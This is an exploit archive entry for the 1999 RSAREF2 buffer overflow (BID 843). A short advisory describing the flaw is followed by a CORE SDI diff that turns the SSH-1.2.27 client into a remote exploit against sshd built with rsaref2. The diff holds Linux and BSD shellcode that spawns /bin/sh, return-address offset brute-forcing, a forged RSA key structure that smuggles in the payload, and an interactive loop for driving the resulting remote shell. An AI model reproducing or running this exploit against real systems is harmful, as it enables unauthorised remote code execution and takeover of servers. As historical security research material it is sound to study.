@@ -1,0 +1,508 @@
+source: http://www.securityfocus.com/bid/843/info
+
+A buffer overflow vulnerability exists in the RSAREF cryptographic library which may possibly make any software using the library vulnerable.
+
+The vulnerability exists in four functions in the rsa.c source file. The functions are:
+
+int RSAPublicEncrypt()
+int RSAPrivateEncrypt()
+int RSAPublicDecrypt()
+int RSAPrivateDecrypt()
+
+All these function define a local variable called pkcsBlock of 128 byte length which can be overflowed making it possible to execute arbitrary code.
+
+This vulnerability, in conbination with BUGTRAQ ID 797, allows versions of both the SSH client and server linked against the RSAREF2 library to be vulnerable to a remote exploit.
+
+Programs linked against the SSLeay and OpenSSL libraries are not vulnerable as these libraries check the modulus lenght is not longer than what the RSAREF library can handle (MAX_RSA_MODULUS_LEN) in the RSAref_Public_eay2ref() and RSAref_Private_eay2ref() glue functions. 
+
+diff -N -c ssh-1.2.27/README.coresdi ssh-1.2.27-exploit/README.coresdi
+*** ssh-1.2.27/README.coresdi	Wed Dec 31 21:00:00 1969
+--- ssh-1.2.27-exploit/README.coresdi	Tue Dec 14 19:21:10 1999
+***************
+*** 0 ****
+--- 1,32 ----
++ /*
++  *
++  * Descrition: Exploit code for SSH-1.2.27 sshd with rsaref2 compiled in
++  * (--with-rsaref)
++  *
++  * Author: Alberto Solino <Alberto_Solino@core-sdi.com>
++  *
++  * Copyright (c) 1999 CORE SDI S.A., Buenos Aires, Argentina.
++  * All rights reserved.
++  *
++  *
++  * THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES
++  * ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI S.A. BE LIABLE FOR ANY DIRECT,
++  * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR CONSEQUENTIAL DAMAGES RESULTING
++  * FROM THE USE OR MISUSE OF THIS SOFTWARE.
++  *
++  */
++ 
++ Tested on
++   SSH-1.2.27 Linux RedHat 6.0
++   SSh-1.2.27 OpenBSD 2.6
++ 
++ Details
++   Relies on offsets taken from JUMP_TO_MY_KEY that are different on
++   different boxes.
++   If it doesnt work, check inside incoming.buf for the string "BETO"
++   and find the proper offsets from there.
++   Additionally, the -f nad -t options are available, to  provide
++   a range of addresses and try to brute force remotely the right 
++   one.
++   Specify the target os type with -o
++ 
+Binary files ssh-1.2.27/exploit_key and ssh-1.2.27-exploit/exploit_key differ
+diff -N -c ssh-1.2.27/exploit_key.pub ssh-1.2.27-exploit/exploit_key.pub
+*** ssh-1.2.27/exploit_key.pub	Wed Dec 31 21:00:00 1969
+--- ssh-1.2.27-exploit/exploit_key.pub	Tue Nov 30 01:14:10 1999
+***************
+*** 0 ****
+--- 1 ----
++ 1024 35 126711790959034717449904354103174105464423905750911738400315407900752946071988773532672356922306687685191424606806952947660867911760697942514594956213990584856991678398353026692681430136274853402829183803383791361598788187120276305630837366787507026341329913385926890796258293060370046555624537870005279144741 root@jack
+Common subdirectories: ssh-1.2.27/gmp-2.0.2-ssh-2 and ssh-1.2.27-exploit/gmp-2.0.2-ssh-2
+diff -N -c ssh-1.2.27/history ssh-1.2.27-exploit/history
+*** ssh-1.2.27/history	Wed Dec 31 21:00:00 1969
+--- ssh-1.2.27-exploit/history	Tue Nov 16 21:41:36 1999
+***************
+*** 0 ****
+--- 1,7 ----
++ Tue Nov 16 19:58:04 ART 1999
++ En RSAPrivateBlock, no calcula la longitud de salida del buffer, simplemente copia
++ el tamanio del modulo que esta en privatekey, pero la longitud de los numeros 
++ nunca es mayor que 128.
++ Tue Nov 16 21:41:15 ART 1999
++ overflow en RSAPrivateDecrypt????!?!?!??!?!?! who knows!! fijarse...
++ 
+Common subdirectories: ssh-1.2.27/rsaref2 and ssh-1.2.27-exploit/rsaref2
+diff -N -c ssh-1.2.27/ssh.c ssh-1.2.27-exploit/ssh.c
+*** ssh-1.2.27/ssh.c	Wed May 12 08:19:28 1999
+--- ssh-1.2.27-exploit/ssh.c	Tue Dec 14 19:03:59 1999
+***************
+*** 202,208 ****
+  #include "readconf.h"
+  #include "userfile.h"
+  #include "emulate.h"
+- 
+  #ifdef LIBWRAP
+  #include <tcpd.h>
+  #include <syslog.h>
+--- 202,207 ----
+***************
+*** 212,217 ****
+--- 211,249 ----
+  int allow_severity = LOG_INFO;
+  int deny_severity = LOG_WARNING;
+  #endif /* LIBWRAP */
++ #ifdef SSH_EXPLOIT
++ #define BETO_STR 0x80850f8
++ unsigned long exp_offset=BETO_STR;
++ unsigned long exp_offset_to=BETO_STR;
++ unsigned char *shell_code;
++ unsigned long shell_code_len=0;
++ unsigned char linux_shell_code[]=
++ {0x90    ,0x90    ,0x90    ,0x90    ,0x90    ,0x90    ,0x90    ,0x90
++ ,0xeb    ,0x44    ,0x5e    ,0x89    ,0x76
++ ,0x08    ,0x31    ,0xc0    ,0x88    ,0x46    ,0x07    ,0x89    ,0x46
++ ,0x0c    ,0x56    ,0xb9    ,0x00    ,0x00    ,0x00    ,0x00    ,0xbb
++ ,0x05    ,0x00    ,0x00    ,0x00    ,0xb0    ,0x3f    ,0xcd    ,0x80
++ ,0xb9    ,0x01    ,0x00    ,0x00    ,0x00    ,0xbb    ,0x05    ,0x00
++ ,0x00    ,0x00    ,0xb0    ,0x3f    ,0xcd    ,0x80    ,0xb9    ,0x02
++ ,0x00    ,0x00    ,0x00    ,0xbb    ,0x05    ,0x00    ,0x00    ,0x00
++ ,0xb0    ,0x3f    ,0xcd    ,0x80    ,0x5e    ,0xb0    ,0x0b    ,0x89
++ ,0xf3    ,0x8d    ,0x4e    ,0x08    ,0x8d    ,0x56    ,0x0c    ,0xcd
++ ,0x80    ,0xe8    ,0xb7    ,0xff    ,0xff    ,0xff    ,0x2f    ,0x62
++ ,0x69    ,0x6e    ,0x2f    ,0x73    ,0x68    ,0x00};
++ unsigned char bsd_shell_code[]=
++ {0x90,    0x90,    0x90,    0x90,    0x90,    0x90,    0x90,
++  0xeb,    0x45,    0x5e,    0x89,    0x76,    0x08,    0x31,    0xc0,
++  0x88,    0x46,    0x07,    0x89,    0x46,    0x0c,    0x6a,    0x00,
++  0x6a,    0x05,    0x51,    0xb8,    0x5a,    0x00,    0x00,    0x00,
++  0xcd,    0x80,    0x6a,    0x01,    0x6a,    0x05,    0x51,    0xb8,
++  0x5a,    0x00,    0x00,    0x00,    0xcd,    0x80,    0x6a,    0x02,
++  0x6a,    0x05,    0x51,    0xb8,    0x5a,    0x00,    0x00,    0x00,
++  0xcd,    0x80,    0x6a,    0x00,    0x8d,    0x46,    0x08,    0x50,
++  0x8b,    0x46,    0x08,    0x50,    0xb8,    0x3b,    0x00,    0x00,
++  0x00,    0x31,    0xc9,    0x41,    0x51,    0xcd,    0x80,    0xe8,
++  0xb6,    0xff,    0xff,    0xff,    0x2f,    0x62,    0x69,    0x6e,
++  0x2f,    0x73,    0x68,	0x00};
++ #endif
+  
+  /* Random number generator state.  This is initialized in ssh_login, and
+     left initialized.  This is used both by the packet module and by various
+***************
+*** 275,280 ****
+--- 307,322 ----
+  /* Prints a help message to the user.  This function never returns. */
+  void usage(void)
+  {
++ #ifdef SSH_EXPLOIT
++ 	fprintf(stderr, "ssh/rsaref2 exploit by Core SDI SA (c) 1999\n");
++ 	fprintf(stderr, "Usage:\n\t%s [-f offset_from] [-t offset_to] -o ostype host\n",av0);
++ 	fprintf(stderr, "where:\n");
++ 	fprintf(stderr, "\toffset_from:       start offset for brute force\n");
++ 	fprintf(stderr, "\toffset_to:         end offset for brute force\n");
++ 	fprintf(stderr, "\tostype:            remote machine ostype\n");
++ 	fprintf(stderr, "                     BSD   : for (*BSD)\n");
++ 	fprintf(stderr, "                     Linux : for Intel Linuxes\n\n");
++ #else
+    fprintf(stderr, "Usage: %s [options] host [command]\n", av0);
+    fprintf(stderr, "Options:\n");
+    fprintf(stderr, "  -l user     Log in using this user name.\n");
+***************
+*** 321,326 ****
+--- 363,369 ----
+    fprintf(stderr, "  -C          Enable compression.\n");
+    fprintf(stderr, "  -g          Allow remote hosts to connect to local port forwardings\n");
+    fprintf(stderr, "  -o 'option' Process the option as if it was read from a configuration file.\n");
++ #endif
+    exit(1);
+  }
+  
+***************
+*** 504,510 ****
+--- 547,557 ----
+        opt = av[optind][1];
+        if (!opt)
+          usage();
++ #ifdef SSH_EXPLOIT
++       if (strchr("fto", opt)) /* options with arguments */
++ #else
+        if (strchr("eilcpLRo", opt)) /* options with arguments */
++ #endif
+          {
+            optarg = av[optind] + 2;
+            if (strcmp(optarg, "") == 0)
+***************
+*** 522,527 ****
+--- 569,594 ----
+          }
+        switch (opt)
+          {
++ #ifdef SSH_EXPLOIT
++ 				case 'f':
++ 					exp_offset = strtoul(optarg,NULL,16);
++ 					break;
++ 				case 't':
++ 					exp_offset_to = strtoul(optarg,NULL,16);
++ 					break;
++ 				case 'o':
++ 					if ( !strcmp(optarg,"BSD") ) {
++ 						shell_code = bsd_shell_code;
++ 						shell_code_len = sizeof(bsd_shell_code);
++ 					}
++ 					else if ( !strcmp(optarg,"Linux") ) {
++ 						shell_code = linux_shell_code;
++ 						shell_code_len = sizeof(linux_shell_code);
++ 					}
++ 					else
++ 						usage();
++ 					break;
++ #else
+          case 'n':
+            stdin_null_flag = 1;
+            break;
+***************
+*** 681,692 ****
+          case 'g':
+            options.gateway_ports = 1;
+            break;
+! 
+          default:
+            usage();
+          }
+      }
+! 
+   /* Check that we got a host name. */
+    if (!host)
+      usage();
+--- 748,766 ----
+          case 'g':
+            options.gateway_ports = 1;
+            break;
+! #endif
+          default:
+            usage();
+          }
+      }
+! #ifdef SSH_EXPLOIT
+! 	if ( shell_code == NULL )
+! 		usage();
+! 	if ( exp_offset_to < exp_offset ) {
+! 		fprintf(stderr,"Invalid offsets!\n");
+! 		usage();
+! 	}
+! #endif
+   /* Check that we got a host name. */
+    if (!host)
+      usage();
+***************
+*** 793,798 ****
+--- 867,876 ----
+       rhosts_authentication is true.  Note that the random_state is not
+       yet used by this call, although a pointer to it is stored, and thus it
+       need not be initialized. */
++ #ifdef SSH_EXPLOIT
++ 	do	
++ 	{
++ #endif
+    ok = ssh_connect(host, options.port, options.connection_attempts,
+                     !use_privileged_port,
+                     original_real_uid, options.proxy_command, &random_state);
+***************
+*** 846,857 ****
+                                                    original_real_uid);
+    options.user_hostfile = tilde_expand_filename(options.user_hostfile,
+                                                  original_real_uid);
+! 
+    /* Log into the remote system.  This never returns if the login fails. 
+       Note: this initializes the random state, and leaves it initialized. */
+    ssh_login(&random_state, host_private_key_loaded, &host_private_key, 
+              host, &options, original_real_uid);
+! 
+    /* We no longer need the host private key.  Clear it now. */
+    if (host_private_key_loaded)
+      rsa_clear_private_key(&host_private_key);
+--- 924,941 ----
+                                                    original_real_uid);
+    options.user_hostfile = tilde_expand_filename(options.user_hostfile,
+                                                  original_real_uid);
+! #ifdef SSH_EXPLOIT
+!   fprintf(stdout,"Tryin'... 0x%x\n",exp_offset);
+! #endif
+    /* Log into the remote system.  This never returns if the login fails. 
+       Note: this initializes the random state, and leaves it initialized. */
+    ssh_login(&random_state, host_private_key_loaded, &host_private_key, 
+              host, &options, original_real_uid);
+! #ifdef SSH_EXPLOIT
+! 	exp_offset++;
+! 	} while (exp_offset<=exp_offset_to);
+! 	fprintf(stderr,"Didn't work ;( \n");
+! #endif
+    /* We no longer need the host private key.  Clear it now. */
+    if (host_private_key_loaded)
+      rsa_clear_private_key(&host_private_key);
+diff -N -c ssh-1.2.27/sshconnect.c ssh-1.2.27-exploit/sshconnect.c
+*** ssh-1.2.27/sshconnect.c	Wed May 12 08:19:29 1999
+--- ssh-1.2.27-exploit/sshconnect.c	Thu Dec  9 17:09:39 1999
+***************
+*** 214,220 ****
+  #include "mpaux.h"
+  #include "userfile.h"
+  #include "emulate.h"
+- 
+  #ifdef KERBEROS
+  #ifdef KRB5
+  #include <krb5.h>
+--- 214,219 ----
+***************
+*** 1271,1276 ****
+--- 1270,1280 ----
+                 const char *orighost, 
+                 Options *options, uid_t original_real_uid)
+  {
++ #ifdef SSH_EXPLOIT
++ extern unsigned long exp_offset;
++ extern unsigned char *shell_code;
++ extern unsigned long shell_code_len;
++ #endif
+    int i, type, len, f;
+    char buf[1024], seedbuf[16];
+    char *password;
+***************
+*** 1278,1283 ****
+--- 1282,1298 ----
+    MP_INT key;
+    RSAPublicKey host_key;
+    RSAPublicKey public_key;
++ #ifdef SSH_EXPLOIT
++   MP_INT fakekey;
++   int retval;
++   unsigned char first;
++   struct sockaddr_in sin;
++   int sin_len=sizeof(struct sockaddr_in);
++   RSAPrivateKey myfakeKey;
++   RSAPrivateKey myPrivateKey;
++   char private_key_filename[]="exploit_key";
++   fd_set rfds;
++ #endif
+    unsigned char session_key[SSH_SESSION_KEY_LENGTH];
+    const char *server_user, *local_user;
+    char *cp, *host;
+***************
+*** 1501,1506 ****
+--- 1516,1522 ----
+    /* Generate an encryption key for the session.   The key is a 256 bit
+       random number, interpreted as a 32-byte key, with the least significant
+       8 bits being the first byte of the key. */
++ 
+    for (i = 0; i < SSH_SESSION_KEY_LENGTH; i++)
+      session_key[i] = random_get_byte(state);
+  
+***************
+*** 1519,1532 ****
+        else
+          mpz_add_ui(&key, &key, session_key[i]);
+      }
+! 
+    /* Encrypt the integer using the public key and host key of the server
+       (key with smaller modulus first). */
+    if (mpz_cmp(&public_key.n, &host_key.n) < 0)
+      {
+        /* Public key has smaller modulus. */
+        assert(host_key.bits >= public_key.bits + SSH_KEY_BITS_RESERVED);
+- 
+        rsa_public_encrypt(&key, &key, &public_key, state);
+        rsa_public_encrypt(&key, &key, &host_key, state);
+      }
+--- 1535,1552 ----
+        else
+          mpz_add_ui(&key, &key, session_key[i]);
+      }
+! #ifdef SSH_EXPLOIT
+! 	if ( load_private_key(getuid(),private_key_filename,"",&myPrivateKey,NULL)==0) { 
+! 		fprintf(stderr,"Cannot locate private key %s\n",private_key_filename);
+! 		exit(1);
+!   }
+! #endif
+    /* Encrypt the integer using the public key and host key of the server
+       (key with smaller modulus first). */
+    if (mpz_cmp(&public_key.n, &host_key.n) < 0)
+      {
+        /* Public key has smaller modulus. */
+        assert(host_key.bits >= public_key.bits + SSH_KEY_BITS_RESERVED);
+        rsa_public_encrypt(&key, &key, &public_key, state);
+        rsa_public_encrypt(&key, &key, &host_key, state);
+      }
+***************
+*** 1534,1540 ****
+      {
+        /* Host key has smaller modulus (or they are equal). */
+        assert(public_key.bits >= host_key.bits + SSH_KEY_BITS_RESERVED);
+- 
+        rsa_public_encrypt(&key, &key, &host_key, state);
+        rsa_public_encrypt(&key, &key, &public_key, state);
+      }
+--- 1554,1559 ----
+***************
+*** 1564,1569 ****
+--- 1583,1637 ----
+    for (i = 0; i < 8; i++)
+      packet_put_char(check_bytes[i]);
+  
++ #ifdef SSH_EXPLOIT
++ 	for ( i = 0 ; i < 16; i++ ) {
++ 		mpz_mul_2exp(&key, &key, 8);
++ 		mpz_add_ui(&key, &key, i+1);
++ 	}
++ 	/* Aca seto el lugar donde va a estar la clave nueva cambiada*/
++ 	for ( i = 0; i < 4 ; i++ ) {
++ 		mpz_mul_2exp(&key,&key,8);
++ 		mpz_add_ui(&key,&key, ((exp_offset+9) >> (i*8) & 0xff));
++ 	}
++ 
++ 	/* Con esto fuerzo a que el ciphertext sea mas chico que el modulo*/
++ 	key._mp_d[31]=0;
++ 	key._mp_d[32]=0;
++ 	key._mp_d[3]=htonl(exp_offset+0x5b);
++ 	/* Ret address a mi codigo */
++ 	//key._mp_d[3]=0x51510808; // JUMP_TO_MY_KEY+87 dado vuelta
++ 	/*
++ 	No se porque mierda ahora hay que invertilo...
++ 	key._mp_d[3]=JUMP_TO_MY_KEY+80;
++ 	*/
++ 
++ 	myfakeKey.bits = 1182; /* Tamanio de la clave */
++ 	myfakeKey.n._mp_alloc = 33;
++ 	myfakeKey.n._mp_size = 32;
++ 	myfakeKey.n._mp_d = (unsigned long int *)(exp_offset+184);
++ 
++ 	myfakeKey.e._mp_alloc = 1;
++ 	myfakeKey.e._mp_size = 1;
++ 	myfakeKey.e._mp_d = (unsigned long int *)(exp_offset+316);
++ 
++ 	myfakeKey.d._mp_alloc = 1;
++ 	myfakeKey.d._mp_size = 1;
++ 	myfakeKey.d._mp_d = (unsigned long int *)(exp_offset+25);
++ 
++ 	myfakeKey.u._mp_alloc = 17;
++ 	myfakeKey.u._mp_size = 16;
++ 	myfakeKey.u._mp_d = (unsigned long int *)(exp_offset+460);
++ 
++ 	myfakeKey.p._mp_alloc = 17;
++ 	myfakeKey.p._mp_size = 16;
++ 	myfakeKey.p._mp_d = (unsigned long int *)(exp_offset+392);
++ 
++ 	myfakeKey.q._mp_alloc = 17;
++ 	myfakeKey.q._mp_size = 16;
++ 	myfakeKey.q._mp_d = (unsigned long int *)(exp_offset+324);
++ 
++ #endif
++ 
+    /* Send the encrypted encryption key. */
+    packet_put_mp_int(&key);
+  
+***************
+*** 1571,1579 ****
+--- 1639,1686 ----
+    packet_put_int(SSH_PROTOFLAG_SCREEN_NUMBER | SSH_PROTOFLAG_HOST_IN_FWD_OPEN);
+  
+    /* Send the packet now. */
++ #ifdef SSH_EXPLOIT
++   packet_put_string("BETO",4);
++   packet_put_string((char *)&myfakeKey,sizeof(myfakeKey));
++   packet_put_string(shell_code, shell_code_len);
++   packet_put_string((char *)myPrivateKey.n._mp_d,myPrivateKey.n._mp_size*4);
++   packet_put_string((char *)myPrivateKey.e._mp_d,myPrivateKey.e._mp_size*4);
++   packet_put_string((char *)myPrivateKey.q._mp_d,myPrivateKey.q._mp_size*4);
++   packet_put_string((char *)myPrivateKey.p._mp_d,myPrivateKey.p._mp_size*4);
++   packet_put_string((char *)myPrivateKey.u._mp_d,myPrivateKey.u._mp_size*4);
++ #endif
+    packet_send();
+    packet_write_wait();
++ #ifdef SSH_EXPLOIT
+  
++ 	usleep(10);
++ 	first = 1;
++ 	i = write(packet_get_connection_in(),"id\n",3);
++ 	if ( getpeername(packet_get_connection_in(),(struct sockaddr *)&sin, &sin_len) == -1)
++ 		return;
++ 		
++ 	while (1) {
++   	FD_ZERO(&rfds);
++ 		FD_SET(packet_get_connection_in(),&rfds);
++ 		FD_SET(STDIN_FILENO,&rfds);
++ 		if ( (retval = select(packet_get_connection_in()+1,&rfds,NULL,NULL,NULL)) < 0 )
++ 			return;
++ 		if (FD_ISSET(STDIN_FILENO,&rfds)) {
++ 			i=read(STDIN_FILENO,buf,sizeof(buf));
++ 			write(packet_get_connection_out(),buf,i);
++ 		} else if (FD_ISSET(packet_get_connection_in(),&rfds)) {
++ 			i=read(packet_get_connection_in(),buf,sizeof(buf));
++ 			if ( first )
++ 				if ( strncmp(buf,"uid",3) )
++ 					return;
++ 				else {
++ 					fprintf(stdout,"Got it!\n");
++ 					first = 0;
++ 				}
++ 			write(STDOUT_FILENO,buf,i);
++ 		}
++ 	}	
++ #endif
+    /* Destroy the session key integer and the public keys since we no longer
+       need them. */
+    mpz_clear(&key);
+***************
+*** 1583,1588 ****
+--- 1690,1697 ----
+    debug("Sent encrypted session key.");
+    
+    /* Set the encryption key. */
++   packet_set_encryption_key(session_key, SSH_SESSION_KEY_LENGTH+120, 
++                             options->cipher, 1);
+    packet_set_encryption_key(session_key, SSH_SESSION_KEY_LENGTH, 
+                              options->cipher, 1);
+  
+Common subdirectories: ssh-1.2.27/zlib-1.0.4 and ssh-1.2.27-exploit/zlib-1.0.4
